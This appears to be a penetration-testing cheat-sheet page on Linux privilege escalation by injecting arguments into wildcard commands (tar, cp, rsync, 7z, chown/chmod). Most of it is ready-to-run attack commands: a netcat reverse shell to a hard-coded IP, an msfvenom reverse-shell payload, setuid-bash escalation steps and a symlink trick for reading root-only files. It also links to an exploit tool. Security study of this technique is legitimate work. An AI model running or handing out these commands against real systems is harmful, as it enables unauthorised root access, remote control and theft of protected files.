# PrivEsc via Wildcards

{% hint style="danger" %}
If you find a wildcard (**\***) after the 2 dashes (**--**), the attack will not work because the 2 dashes mean that the following input cannot be treated as parameters. This does NOT happen with the 7z command.
{% endhint %}

## tar (wildcard)

You can exploit this using: [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py)

More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

```bash
# Method 1:
echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar *
# Method 2:
touch -- "--checkpoint-action=exec=chmod +s \$(which bash)"
echo "" > --checkpoint=1
tar cf archive.tar *
# Method 3:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf
touch -- --checkpoint=1
touch -- --checkpoint-action=exec=shell.elf
```

## cp (wildcard)

```bash
cp * /dev/shm/ # Vulnerable

cd /tmp
cp /bin/bash .
chmod 4777 bash 
touch -- --preserve=mode
# Wait for it to run: cp * /dev/shm/
/dev/shm/bash -p
```

## rsync (wildcard)

Rsync has a parameter that allows us to execute commands:

```bash
Interesting rsync option from manual:
 -e, --rsh=COMMAND           specify the remote shell to use
     --rsync-path=PROGRAM    specify the rsync to run on remote machine
```

Exploit:

```bash
echo -n 'chmod +s /bin/bash' > shell.sh
touch -- "-e sh shell.sh"
```

You can exploit this using: [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py)

More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z (wildcard)

In **7z** even using `--` before `*` (note that `--` means that the following input cannot treated as parameters, so just file paths in this case) you can cause an arbitrary error to read a file, so if a command like the following one is being executed by root:

```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```

And you can create files in the folder were this is being executed, you could create the file `@root.txt` and the file `root.txt` being a **symlink** to the file you want to read:

```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```

Then, when **7z** is execute, it will treat `root.txt` as a file containing the list of files it should compress (thats what the existence of `@root.txt` indicates) and when it 7z read `root.txt` it will read `/file/you/want/to/read` and **as the content of this file isn't a list of files, it will throw and error** showing the content.

## chown, chmod (wildcard)

You can **indicate which file owner and permissions you want to copy for the rest of the files:**

```bash
touch "--reference=/my/own/path/filename"
```

You can exploit this using: [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py)

More info in **** [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
